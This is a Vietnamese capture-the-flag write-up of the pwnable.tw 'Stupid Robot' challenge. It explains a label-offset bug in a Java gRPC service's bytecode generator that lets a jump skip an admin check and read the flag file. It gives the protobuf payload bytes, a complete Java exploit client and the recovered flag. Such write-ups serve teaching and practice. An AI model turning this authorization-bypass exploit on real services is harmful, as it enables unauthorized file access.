+++
title = 'Pwnable.tw - Stupid Robot'
date = 2026-10-12T12:15:00+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Stupid Robot

`chall.pwnable.tw:10311` (gRPC)

### 1. Phân tích Binary

Đề phát một `robot.jar` chứa gRPC frontend và worker Java. Với mỗi kết nối, frontend chạy worker `--box` trong namespace riêng, timeout ba giây. Client gửi danh sách lệnh dạng protobuf; class loader `aP` dịch chúng thành bytecode cho lớp `MyRobot` kế thừa `Robot`.

Đường cập nhật robot nằm trong `App.a(w)` (rút gọn):

```java
if (w.a().size() > 500) return null;
Class<?> c = new aP(w).loadClass("MyRobot");
Object o = c.getDeclaredConstructor().newInstance();
if (!(o instanceof Robot)) return null;
return (Robot) o;
```

Ban đầu mình nhìn `Robot.getHashFlag()`: hàm đọc 32 byte đầu của `/home/challenge/flag`, băm SHA-256 rồi so với token để bật `admin`. Cách này là ngõ cụt vì muốn có token phải biết flag trước. Các lệnh chat bình thường chỉ có `time`, `note`, `read-note`, `toss-coin`; đường note dùng tên file số nguyên cố định trong `/tmp`, không đọc được flag.

#### Chỗ kiểm tra quyền

Macro `machineid` (opcode 43) chứa đoạn đọc `/home/challenge/flag`, nhưng trước nó là kiểm tra `Robot.admin`:

```text
ALOAD_0
GETFIELD Robot.admin
IFEQ Lskip
NEW java/io/File           <- bắt đầu đoạn đọc flag
```

Đoạn đọc flag đã nằm sẵn trong một macro của bộ sinh bytecode. Nếu có cách nhảy vào giữa macro, ngay **sau** `IFEQ`, object với `admin == false` vẫn đi vào lệnh mở file.

#### Bug - lệch nhãn giữa hai pass

`aP` sinh bytecode qua hai pass. Pass đầu thêm một label cho **mỗi instruction được phát ra**, kể cả những instruction bên trong một macro dài. Pass sau vá các lệnh nhảy bằng công thức dựa trên chỉ số lệnh nguồn và một bộ đếm `g`:

```java
int pos = ((i + e.get(i)) << 1) + 1;
int target = i - goto.offset;
LabelNode dst = b.get(target + e.get(target));
```

Điểm sai là một `Instruction {}` không đặt trường `opcode` vẫn tăng chỉ số nguồn nhưng **không phát ra bytecode**. Một `Ldc {}` không đặt constant cũng vậy. Trong ghi chú phân tích ban đầu mình nghi các hằng `g += N` của macro sai; đo lại từng macro bằng reflection cho thấy chúng đúng. Chính lệnh rỗng mới tạo độ lệch `+1`. Ba lệnh rỗng liên tiếp cho độ lệch `+3`.

### 2. Khai thác

Payload chỉ có bảy lệnh:

```text
0  Goto { offset = -4 }
1  Instruction {}
2  Instruction {}
3  Instruction {}
4  Machineid {}
5  B2s {}
6  Return { type = STRING }
```

`Goto` phải đứng **trước** các lệnh gây lệch. Như vậy pass hai vẫn tìm đúng ô cần vá của chính `Goto`; chỉ nhãn đích bị lệch. Offset `-4` đưa đích danh nghĩa đến source index 4. Ba lệnh rỗng đẩy nhãn ấy vào instruction thứ tư của `machineid`: `NEW java/io/File`, ngay sau `IFEQ`.

Mình tưởng cần thêm lệnh chuẩn bị operand stack, nhưng không: tại `NEW` stack đang rỗng, đúng điều Java verifier mong đợi. Macro đọc file xong để lại `byte[]` trên stack; `B2s` đổi thành `String`, `Return STRING` đưa nó ra `chat()`.

Wire format của protobuf gồm `CommandRequest` với một nhánh `Code` để cập nhật class, nhánh `message` để chat. Mình gửi request cập nhật, rồi request chat `hi` **trong cùng gRPC stream**, đủ nhanh trước timeout ba giây. Bài được thử local với flag giả qua cả frontend gRPC và worker trước khi gửi remote. Kết quả remote:

40 byte `CommandRequest` cho bước cập nhật class, chép từ payload đã chạy:

```text
1226 0a0e 9a01 0b08 fcff ffff ffff ffff ff01 0a00 0a00 0a00
0a03 da02 000a 03b2 0200 0a04 1a02 0802
```

Request thứ hai là trường `message = "hi"` (`0a 02 68 69`). Nó gọi `chat()` trên class vừa nạp, làm chuỗi flag đi ra trong gRPC response.

```text
FLAG{dO_y0U_L1k3_thi5_Java_6y4ec0d3_cha113nge?}
```

`FLAG: FLAG{dO_y0U_L1k3_thi5_Java_6y4ec0d3_cha113nge?}`

### Full exploit

Compile với `robot.jar` đi kèm, rồi chạy client với host và port của đề:

```sh
javac -cp robot.jar -d . Exploit.java
java -cp robot.jar:. ctf.hitcon.robot.Exploit chall.pwnable.tw 10311
```

```java
package ctf.hitcon.robot;

import io.grpc.CallOptions;
import io.grpc.ClientCall;
import io.grpc.ManagedChannel;
import io.grpc.ManagedChannelBuilder;
import io.grpc.stub.ClientCalls;
import io.grpc.stub.StreamObserver;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Exploit {
    // CommandRequest{code=Code{Goto(-4), {}, {}, {}, Machineid, B2s, Return(STRING)}}
    private static final byte[] CODE_REQUEST = hex(
        "12260a0e9a010b08fcffffffffffffffff010a000a000a000a03da0200"
      + "0a03b202000a041a020802"
    );

    private static byte[] hex(String text) {
        String clean = text.replaceAll("\\s", "");
        byte[] out = new byte[clean.length() / 2];
        for (int i = 0; i < out.length; i++) {
            out[i] = (byte) Integer.parseInt(clean.substring(i * 2, i * 2 + 2), 16);
        }
        return out;
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.err.println("usage: Exploit <host> <grpc-port>");
            System.exit(2);
        }

        ManagedChannel channel = ManagedChannelBuilder
            .forAddress(args[0], Integer.parseInt(args[1]))
            .usePlaintext()
            .build();

        CountDownLatch done = new CountDownLatch(1);
        List<String> replies = new ArrayList<String>();
        StreamObserver response = new StreamObserver() {
            public void onNext(Object value) {
                String message = ((B) value).a();
                System.out.println("REPLY: [" + message + "]");
                replies.add(message);
            }

            public void onError(Throwable error) {
                error.printStackTrace();
                done.countDown();
            }

            public void onCompleted() {
                done.countDown();
            }
        };

        ClientCall call = channel.newCall(aF.a(), CallOptions.DEFAULT);
        StreamObserver request = ClientCalls.asyncBidiStreamingCall(call, response);
        request.onNext(y.a(CODE_REQUEST));
        request.onNext(y.a(new byte[] { 0x0a, 0x02, 'h', 'i' }));
        request.onCompleted();

        done.await(20, TimeUnit.SECONDS);
        channel.shutdownNow();
        channel.awaitTermination(3, TimeUnit.SECONDS);

        Pattern flagPattern = Pattern.compile("FLAG\\{[^}]+\\}");
        for (String reply : replies) {
            Matcher match = flagPattern.matcher(reply);
            if (match.find()) {
                System.out.println("MATCHED_FLAG: " + match.group());
                return;
            }
        }
        throw new IllegalStateException("No complete flag in gRPC responses");
    }
}
```
